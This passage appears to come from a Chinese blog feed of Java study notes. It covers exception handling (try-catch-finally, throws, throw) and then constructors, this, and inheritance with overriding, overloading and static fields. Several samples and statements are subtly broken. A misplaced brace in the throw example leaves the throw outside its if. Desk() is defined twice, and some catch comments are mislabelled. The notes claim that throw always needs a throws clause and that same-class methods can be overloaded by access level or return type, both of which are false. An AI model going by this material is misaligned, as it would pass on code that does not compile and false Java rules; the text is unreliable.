  那么catch语句将不执行。 
**📒(2)catch语句需要一个参数：**<font color="red">**一个异常类名和该异常类的对象。注意该异常类必须是Throwable类的子类**</font>.
**📒(3)** try块中发生了一个异常，try-catch语句就会自动在try块后面的各个catch块中，找出与该异常类相
        匹配的参数。当参数符合以下3个条件之一时，就认为这个参数与产生的异常相匹配：
        （1）参数与产生的异常属于一个类；
        （2）参数是产生的异常的父类；
        （3）参数是一个接口时，产生的异常实现了这一接口。 
<font color="red">**📒(4) 注意：**</font>
(1) 当产生的异常找到了第一个与之相匹配的参数时，就执行包含这一参数的catch语句中的Java代码，执
行完catch语句后，程序恢复执行，但不会回到异常发生处继续执行，而是执行try-catch结构后面的代码。
(2) 可以用一个catch块来处理多个异常类型，此时catch的参数应该是这多个异常的父类。
(3) 有多个catch块时，要细心安排catch块的顺序。<font color="red">  **将子类的catch块放在前面，父类的catch块放在后面。**</font>
</font></td></tr></table>

<p>&emsp;</p>
<h4 id="3-4-finally子句"><a href="#3-4-finally子句" class="headerlink" title="3.4  finally子句"></a><font color="#20B2AA" face="Comic sans MS">3.4  finally子句</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**1.finally语句：**</font> 无论在try块中是否产生异常，也不管产生的异常是否会被捕获，finally中的语句最终都会
                           被执行。
<font color="red">**2.作用：**</font> 为异常处理事件提供一个清理机制,例如清理打开文件、Socket、JDBC连接之类的资源。

<p>  如果程序用到了文件、Socket、JDBC连接之类的资源，即使遇到了异常，也要正确释放占用的资源。<br>&ensp;<strong>finally语句可以说是为异常处理事件提供的一个清理机制. 一般是用来关闭文件或释放其他的系统资源，作<br>  为try-catch-finally结构的一部分，可以没有finally语句，如果存在finally语句，不论try块中是否发生<br>  了异常，是否执行过catch语句，都要执行finally语句。</strong></p>
<p><font color="red"><strong>3. 带有finally子句的try-catch-finally语句的形式如下：</strong></font></font></td></tr></table>  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123; … &#125;           <span class="comment">//…是正常执行的代码, 可能产生异常</span></span><br><span class="line">       <span class="keyword">catch</span> (异常类<span class="number">1</span> e) &#123; … &#125;    <span class="comment">//…是异常类1的处理代码</span></span><br><span class="line">       <span class="keyword">catch</span> (异常类<span class="number">2</span> e) &#123; … &#125;    <span class="comment">//…是异常类1的处理代码</span></span><br><span class="line">        ……</span><br><span class="line">      <span class="keyword">catch</span> (异常类n e) &#123; … &#125;   <span class="comment">//…是异常类2的处理代码</span></span><br><span class="line">      <span class="keyword">finally</span> &#123; … &#125;                   <span class="comment">//…是执行清除工作的语句</span></span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**4.执行过程：**</font> 
**(1) try块中的语句没有产生异常。**在这种情况下，Java首先执行try块中的所有的语句，然后执行finally子句
    中的代码，最后执行try…catch..finally块后面的语句；
**(2) try块中的语句产生了异常，而且此异常在方法内被捕获(有catch匹配)。** 在这种情况下，Java首先执行try
    块中的语句，直到产生异常处，然后跳过此try块中剩下的语句，执行捕获此异常的catch子句的处理代码；
    然后执行finally子句中的代码；
**(3) 如果在catch子句又重新抛出了异常。**也会执行finally，然后将这个异常抛出给方法的调用者；
**(4) try块中产生了异常，而此异常在方法内没有被捕获(没有catch匹配) 。**在这种情况下，Java将执行try块
    中的代码直到产生异常，然后跳过try块中的代码而转去执行finally子句中的代码，最后将异常抛出给方法
    的调用者。
</font></font></td></tr></table>  

<p>&emsp;<br>&emsp;</p>
<h3 id="四、-throws-throw抛出异常"><a href="#四、-throws-throw抛出异常" class="headerlink" title="四、 throws-throw抛出异常"></a><font color="#FF6347" face="Comic sans MS">四、 throws-throw抛出异常</font></h3><h4 id="4-1-throws抛出异常"><a href="#4-1-throws抛出异常" class="headerlink" title="4.1  throws抛出异常"></a><font color="#20B2AA" face="Comic sans MS">4.1  throws抛出异常</font></h4><p><font face="Comic sans MS"><font color="red"><strong>📒throws说明：</strong></font><br><strong>在设计可能会抛出异常的方法时，可以有两个选择：</strong><br><font color="#00B2EE"><strong>(1) 使用try-catch-finally处理方法中的异常</strong></font>；<br><font color="#00B2EE">**(2) 声明抛出异常：**</font>不捕获异常(<font color="red">没有throws方法的创建异常类的实例和抛出异常。是个空语句。</font>)，而是将异常交由上一层处理，在其他地方捕获异常。如果使用后者，那么应该（在某些情况下）向编译器表明：此方法可能会抛出异常，但方法本身不会捕获它。可以在方法头中用throws子句来实现此功能。</p>
<p>(2.1)带throws异常说明的方法说明形式如下：<br>       <font color="#00B2EE"> …  方法名(…) [throws 异常类列表]<br>        { 方法体  }<br></font><br>&emsp;<br><font color="red"><strong>📒注意：</strong></font><br> （１）方法抛出的异常类是throws子句中指定的异常类或其子类。<br> （２）并不是所有可能发生的异常都要在方法的说明中指定，从Error类中派生出的异常和从RuntimeException类中派生的异常就不用在方法声明中指定。</p>
<p><font color="red"><strong>📒在下列情况下Java方法可以声明抛出异常：</strong></font><br> （１）调用的方法抛出了异常；<br> （２）检测到了错误并使用throw语句抛出异常；<br></font> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">例<span class="number">1</span>：调用的方法抛出了异常 </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;……</span><br><span class="line"> <span class="function"><span class="keyword">public</span> String <span class="title">getInput</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123;……</span><br><span class="line">    System.in.read();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例<span class="number">2</span>：检测到了错误并使用<span class="keyword">throw</span>语句抛出异常</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;……</span><br><span class="line"> <span class="function"><span class="keyword">public</span> String <span class="title">getInput</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123;……</span><br><span class="line">     IOException ae =<span class="keyword">new</span> IOException(<span class="string">&quot;buffer is full&quot;</span>);</span><br><span class="line">    <span class="keyword">throw</span> ae; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例<span class="number">3</span>： <span class="keyword">throws</span>多个异常</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animation</span></span></span><br><span class="line"><span class="class"></span>&#123;                                                   </span><br><span class="line"> <span class="function"><span class="keyword">public</span> Image <span class="title">loadImage</span><span class="params">(String s)</span> <span class="keyword">throws</span>  </span></span><br><span class="line"><span class="function">                 EOFException, MalformURLException  </span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  ……</span><br><span class="line"> &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="4-2-throw抛出异常"><a href="#4-2-throw抛出异常" class="headerlink" title="4.2  throw抛出异常"></a><font color="#20B2AA" face="Comic sans MS">4.2  throw抛出异常</font></h4><p><font face="Comic sans MS"><font color="red"><strong>📒throw说明：</strong></font><br><strong>要使用throw，则必须在方法名后面指出throws；但是使用throws，抛出可以是空语句不用写，交给上一层处理！！</strong><br>在捕获一个异常前，必须有一段Java代码来生成和抛出一个异常对象。Java用throw语句抛出异常。throw语句的格式如下：<br>                <font color="red">throw ThrowableObject；<br></font><br>&emsp;<br><font color="#00B2EE"><strong>异常对象的生成和抛出可以有以下三种情况：</strong></font><br>　　　（１）Java运行时系统<br>　　　（２）JDK中某个类<br>　　　（３）在程序中创建异常对象抛出</p>
<p><font color="#00B2EE"><strong>使用throw语句应注意：</strong></font><br>（１）一般这种抛出异常的语句应该在满足一定条件执行，例如把throw语句if分支中<br>（２）含有throw语句的方法，应该在方法头定义中用throws语句声明所有可能抛出的异常</p>
<p><font color="#00B2EE"><strong>抛出异常有这样三步：</strong></font><br>    （1）确定异常类；<br>    （2）创建异常类的实例；<br>    （3）抛出异常。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">举例</span><br><span class="line"><span class="function"><span class="keyword">static</span> String <span class="title">getInput</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">  <span class="keyword">char</span>[] buffer =<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">20</span>];</span><br><span class="line">   <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">boolean</span> flag =<span class="keyword">true</span>;</span><br><span class="line">   <span class="keyword">while</span>(flag) &#123;</span><br><span class="line">       buffer[counter] =(<span class="keyword">char</span>)System.in.read(); </span><br><span class="line">         </span><br><span class="line">      <span class="keyword">if</span>(buffer[counter]==<span class="string">&#x27;\n&#x27;</span>) flag = <span class="keyword">false</span>;</span><br><span class="line">      counter++;</span><br><span class="line">      <span class="keyword">if</span>(counter&gt;=<span class="number">20</span>)&#123;</span><br><span class="line">&#125; IOException ae =<span class="keyword">new</span> IOException(<span class="string">&quot;buffer is full&quot;</span>); </span><br><span class="line">      <span class="keyword">throw</span> ae; &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;//IOException ae =new IOException(&quot;</span><span class="string">&quot;buffer is full&quot;</span><span class="string">&quot;);  throw ae;&quot;</span>使用<span class="keyword">throw</span></span><br></pre></td></tr></table></figure>


<p>&emsp;<br>&emsp;</p>
<h3 id="五、-正确地使用异常"><a href="#五、-正确地使用异常" class="headerlink" title="五、 正确地使用异常"></a><font color="#FF6347" face="Comic sans MS">五、 正确地使用异常</font></h3><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">由于异常使用起来非常方便，以至于在很多情况下可能会滥用异常。但是，使用异常处理会降低程序运行的
速度，几点建议：

<p><font color="red"><strong>（1） 在可以使用简单的测试就能完成的检查中，不要使用异常来代替它。</strong></font>例如：<br>      if (ins!=null)       //使用ins引用对象<br>       {  …   }</p>
<p><font color="red"><strong>（2） 不要过细地使用异常。</strong></font>最好不要到处使用异常，更不要在循环体内使用异常处理, 可以将它包裹在循环<br>体外面。<br><font color="red"><strong>（3）不要捕获了一个异常而又不对它做任何的处理。</strong></font><br>   try<br>   {<br>     …… //正常执行的代码<br>   }<br>   catch(Exception e) {  }</p>
<p><font color="red"><strong>(4) 将异常保留给方法的调用者并非不好的做法。</strong></font><br>     对于有些异常，将其交给方法的调用者去处理是一种更好的处理办法。没有类似这样if(counter&gt;=20){<br>      IOException ae =new IOException(“buffer is full”);<br>      throw ae; }的语句，是个空语句。<br></font></font></td></tr></table>  </p>
<hr>
<hr>
<p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java构造方法、对象创建、继承(4.5-4.6)</title>
    <url>/post/Java-Inherit-4/</url>
    <content><![CDATA[<p>&ensp;<br>&ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>继承</font></center>

<p>&ensp;<br>&ensp;</p>
<h3 id="一、-构造方法"><a href="#一、-构造方法" class="headerlink" title="一、 构造方法"></a><font color="#FF6347" face="Comic sans MS">一、 构造方法</font></h3><p><font color="red"><strong>📒定义：</strong></font> 构造方法是一种特殊的、与类同名的方法，专门用于<font color="red">创建对象，完成初始化工作。</font> </p>
<p>&emsp;</p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒构造方法的特殊性：**</font> 
**(1)构造方法的方法名与类名相同。**
**(2)构造方法没有返回类型，也不能写void。**
**(3)构造方法的主要作用是完成对类对象的初始化工作。**
**(4)构造方法一般不能由编程人员显式地直接调用，而是用new来调用。**
**(5)在创建一个类的新对象的同时，系统会自动调用该类的构造方法为新对象初始化。**
**(6)在Java中，每个类都至少有一个构造方法，如果没有显示地定义构造方法，Java
   会自动提供一个缺省的构造方法。**
</font></td></tr></table>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-1-构造方法说明"><a href="#1-1-构造方法说明" class="headerlink" title="1.1  构造方法说明"></a><font color="#3CB371" face="Comic sans MS">1.1  构造方法说明</font></h4><p><font color="red"><strong>📒构造方法说明形式如下：</strong></font><br><font color="red">[构造方法修饰符] 方法名（[形式参数列表]）[throws异常列表] {方法体}</font> </p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒当构造一个类的实例时，编译器主要完成以下3件事情：**
(1) 为对象分配内存空间(堆)；
(2) 按缺省值初始化对象中的实例变量的值；
(3) 调用对象的构造方法(可以在构造方法中初始化其他的值)；
(4) 对象变量都是引用型变量。
</font></td></tr></table>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-2-构造方法的重载"><a href="#1-2-构造方法的重载" class="headerlink" title="1.2  构造方法的重载"></a><font color="#3CB371" face="Comic sans MS">1.2  构造方法的重载</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">(1)  缺省的构造方法：如果没有定义构造方法，则Java自动提供了一个缺省的构造方法，如下：
public Person(){}；//对象成员变量的初值按Java规定
(2)  带参数的构造方法：按需要将一些指定的参数传递给构造方法 
 例如：public Person(String n){Name=n;}
**📒定义构造方法注意：**
&emsp;只要类中显式定义了一个或多个构造方法，而且所有显式定义的构造方法都带参数，那么将失去缺省
   构造方法。
</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PersonC(String n ,<span class="keyword">int</span> a)&#123;</span><br><span class="line">   name=n;</span><br><span class="line">   age=a;</span><br><span class="line">   System.out.println(<span class="string">&quot;The Person&#x27;s name is &quot;</span>+name+<span class="string">&quot;,age is &quot;</span>+age);&#125; </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      PersonC per1=<span class="keyword">new</span> PersonC();</span><br><span class="line">      PersonC per2=<span class="keyword">new</span> PersonC(<span class="string">&quot;wang li&quot;</span>);</span><br><span class="line">      PersonC per3=<span class="keyword">new</span> PersonC(<span class="string">&quot;li ming&quot;</span>,<span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-3-对象的创建"><a href="#1-3-对象的创建" class="headerlink" title="1.3  对象的创建"></a><font color="#3CB371" face="Comic sans MS">1.3  对象的创建</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**1.3.1 📒对象说明：**
对象说明的语法形式为：
&emsp;&emsp;&emsp;<font color="red">类名&emsp;对象名；</font>
**1.3.2. 📒对象的实例化和初始化:**
**对象构造的语法形式为：**
&emsp;&emsp;&emsp;<font color="red">对象名=new 类构造方法名([实参表]);</font> 
**由new操作符和相应的构造方法完成：**
new以类为模板，开辟空间并执行相应的构造方法，完成对象的实例化和初始化，并返回该对象的一个引
用（即该对象所在的内存首地址)
</font></td></tr></table>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-4-this的使用"><a href="#1-4-this的使用" class="headerlink" title="1.4  this的使用"></a><font color="#3CB371" face="Comic sans MS">1.4  this的使用</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**1.4.1 📒使用this来访问成员变量及方法**
在方法及构造方法中，可以使用this来访问对象的属性和方法 .
**1.4.2. 📒构造方法中，用this调用另一构造方法：**
**1.4.3. 📒使用this的注意事项：**
(1)通过this不仅可以引用该类中定义的变量和方法，还可以引用该类的父类中定义的成员变量和方法。
(2)在所有的非static方法中，都隐含了一个参数this。而static方法中，不能使用this。
</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.4</span>.<span class="number">1</span></span><br><span class="line"> Person(String n,<span class="keyword">int</span> a)&#123;</span><br><span class="line">        name=n;</span><br><span class="line">        age=a;</span><br><span class="line">    &#125; </span><br><span class="line">等价于如下：</span><br><span class="line"> Person(String name,<span class="keyword">int</span> age)</span><br><span class="line">           &#123;<span class="keyword">this</span>.name=name;</span><br><span class="line">             <span class="keyword">this</span>.age=age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.4</span>.<span class="number">2</span> </span><br><span class="line"> Desk()&#123;   Color=<span class="string">&quot;&quot;</span>;</span><br><span class="line">           Length=<span class="number">0</span>;</span><br><span class="line">         Width=<span class="number">0</span>;</span><br><span class="line">         Height=<span class="number">0</span>;&#125; </span><br><span class="line"> Desk(String C,<span class="keyword">int</span> L,<span class="keyword">int</span> W,<span class="keyword">int</span> H)</span><br><span class="line">  &#123;Color=C;</span><br><span class="line">     Length=L;</span><br><span class="line">   Width=W;</span><br><span class="line">   Height=H;&#125; </span><br><span class="line"> Desk()&#123;</span><br><span class="line">    <span class="keyword">this</span>(<span class="string">&quot;&quot;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h3 id="二、-继承"><a href="#二、-继承" class="headerlink" title="二、 继承"></a><font color="#FF6347" face="Comic sans MS">二、 继承</font></h3><h4 id="2-1-类继承语法形式"><a href="#2-1-类继承语法形式" class="headerlink" title="2.1  类继承语法形式"></a><font color="#3CB371" face="Comic sans MS">2.1  类继承语法形式</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**2.1.1 📒类继承语法形式如下：**
&emsp;&emsp;<font color="red">class&emsp;SubClassName&emsp;extends&emsp;SupperClassName</font>
extends：继承关键词
SubClassName：新的子类名
SupperClassName：继承的父类名，必须有且只能一个（即每个子类有且只能有一个父类）
**2.1.2 📒子类的特性:**
(1) 子类拥有其父类的所有属性和方法。但父类中说明为private的属性和方法，子类不可直接访问。
(2) 子类可以对父类的方法覆盖或重载。
</font></td></tr></table>

<p>&emsp;<br>&emsp;</p>
<h4 id="2-2-属性的继承、隐藏和添加"><a href="#2-2-属性的继承、隐藏和添加" class="headerlink" title="2.2  属性的继承、隐藏和添加"></a><font color="#3CB371" face="Comic sans MS">2.2  属性的继承、隐藏和添加</font></h4><p><strong>注意：属性叫隐藏，方法叫覆盖</strong><br><font face="Comic sans MS"><strong>2.2.1 📒属性的继承：</strong><br>• 子类可以继承父类的所有属性（只要该属性没有private修饰）<br>• 通过属性的继承，子类不需要把父类属性的定义部分重复定义一遍，这样做的好处是减少程序维护的工作量。<br><font color="red">例如：ColorPoint类自动具有Point类的坐标a,b属性</font></font><br>&emsp;<br><font face="Comic sans MS"><strong>2.2.2 📒属性的隐藏：</strong><br>子类重新定义一个与父类那里继承来的成员变量完全相同的变量，就称作属性的隐藏。</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="keyword">public</span> <span class="keyword">int</span> age; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">human</span> <span class="keyword">extends</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="keyword">public</span> <span class="keyword">int</span> age; <span class="comment">//将父类的age隐藏</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">   </span>&#123; human h1=<span class="keyword">new</span> human(); h1.age=<span class="number">20</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><strong>2.2.3 📒属性的添加：</strong></font><br>在定义子类时，加上的新的属性变量，就可以使子类比父类多一些属性</p>
<p><font color="red">例如：ColorPoint类比父类Point多了一个属性，颜色（color）</font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="2-3-方法的继承、覆盖、重载和添加"><a href="#2-3-方法的继承、覆盖、重载和添加" class="headerlink" title="2.3  方法的继承、覆盖、重载和添加"></a><font color="#3CB371" face="Comic sans MS">2.3  方法的继承、覆盖、重载和添加</font></h4><p><font face="Comic sans MS"><strong>2.3.1 📒方法的继承：</strong><br>父类的非私有方法也可以被子类自动继承。例如类A具有method()方法，那它的子类B不定义该方法也同样拥有method()。</font></p>
<p>&emsp;<br><font face="Comic sans MS"><strong>2.3.2 📒方法的覆盖：</strong></font></p>
<p><font color="red"><strong>方法的覆盖</strong></font>(方法用覆盖这个词修饰，属性用隐藏这个词来修饰)<br>覆盖：在子类中定义的方法和父类中的方法的首部是一样的，包括方法名、参数列表、返回类型和异常抛出。但方法体的实现改变了。<br><img data-src="https://i.loli.net/2018/12/26/5c23095dc4ba6.png" alt="1.png"></p>
<p><font face="Comic sans MS" color="red"><strong>例如:</strong></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">……</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">method</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">……</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">method</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> <span class="keyword">throws</span>  <span class="comment">//覆盖父类的方法method(int x, int y)</span></span></span><br><span class="line"><span class="function">IOException</span>&#123;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS" color="red">覆盖的效果：当一个B类对象调用method方法时它只会使用B类的method版本，而父类A的method版本被覆盖掉了</font><br><font face="Comic sans MS"><strong>在覆盖时要注意以下几点：</strong><br>（1）覆盖的方法的<font color="#00B2EE"><strong>首部</strong></font>必须要和被覆盖的方法的首部完全匹配，才能达到覆盖的效果；<br>（2）覆盖的方法的<font color="#00B2EE"><strong>返回值类型</strong></font>必须和被覆盖的方法的返回值类型一致；<br>（3）覆盖的方法所<font color="#00B2EE"><strong>抛出的异常</strong></font>必须和被覆盖方法的所抛出的异常一致，或者是其子类；<br>（4）被覆盖的方法<font color="#00B2EE"><strong>不能为private</strong></font>，否则在其子类中只是新定义了一个方法，并没有对其进行覆盖</font><br>&emsp;<br><font face="Comic sans MS"><strong>2.3.3 📒方法的重载：</strong><br><font color="red"><strong>含义：方法名相同，但参数列表不同</strong></font><br>通过方法的覆盖，能够修改对象的同名方法的具体实现体，相同的方法在各个子类中实现的版本可以不一样.<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; —&ensp;—实现多个类中多态性的基础之一<br><font color="red"><strong>重载的效果：</strong></font>父类A的method版本不会被覆盖掉，相当于在子类B中有两个method方法，一个来自父类，一个自己加的，它们之间的参数列表不一样.<br><font color="red"><strong>注意：</strong></font><br>（1）在使用重载时只能通过不同的参数表样式。<br>（2）不能通过访问权限、返回类型、抛出的异常进行重载；(但是同一类里面的成员方法可以这样重载)<br>（3）被重载的方法不能为private，否则在其子类中只是新定义了一个方法，并没有对其进行重载。</p>
<p><font color="red"><strong>特别注意：</strong></font>在继承机制中，不允许在子类中降低成员(包括变量和方法)的访问权限（访问权限大小关系是private &lt; 缺省 &lt; protected &lt; public）。即如果一个方法在父类中是protected的，那么在子类中要重载或覆盖该方法时，就不能把该方法改成是缺省或private，否则会出现编译错误。</font><br>&emsp;<br><font color="green"><em>习题1：分析下列程序输出结果</em> </font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(++a);</span><br><span class="line">           &#125;            </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(a);</span><br><span class="line">           &#125;  </span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">         </span>&#123;  </span><br><span class="line">                   B b=<span class="keyword">new</span> B();</span><br><span class="line">                   b.PrintNumber(<span class="number">100</span>);         </span><br><span class="line">          &#125;   </span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">101</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font color="green"><em>习题2：分析下列程序输出结果</em> </font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(++a);</span><br><span class="line">           &#125;            </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(--a);</span><br><span class="line">           &#125;  </span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">         </span>&#123;  </span><br><span class="line">                   B b=<span class="keyword">new</span> B();</span><br><span class="line">                   b.PrintNumber(<span class="number">100</span>);         </span><br><span class="line">          &#125;   </span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">99</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;<br><font face="Comic sans MS"><strong>2.3.4 📒方法的添加：</strong><br><font color="red"><strong>子类可以新加一些方法，以针对子类实现相应的功能.</strong></font><br></font></p>
<p>&emsp;<br>&emsp;</p>
<h5 id="2-4-静态成员变量的继承"><a href="#2-4-静态成员变量的继承" class="headerlink" title="2.4  静态成员变量的继承"></a><font color="#3CB371" face="Comic sans MS">2.4  静态成员变量的继承</font></h5><p><font face="Comic sans MS">(1)某类的静态成员为该类及该类的所有子类所共有；<br>(2)如果子类中新定义的静态成员变量与父类中的某个静态成员变量同名，则这两个静态成员变量相互独立。</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> b=<span class="number">10</span>; <span class="comment">//静态属性</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">extends</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    test.b=<span class="number">20</span>;</span><br><span class="line">    System.out.println(a.b);        </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">20</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="number">2</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> age; <span class="comment">//静态属性               </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">human</span> <span class="keyword">extends</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> age; <span class="comment">//静态属性</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">               human.age=<span class="number">20</span>;</span><br><span class="line">               System.out.println(living.age);</span><br><span class="line">        &#125;   </span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>&emsp;<br>&emsp;</p>
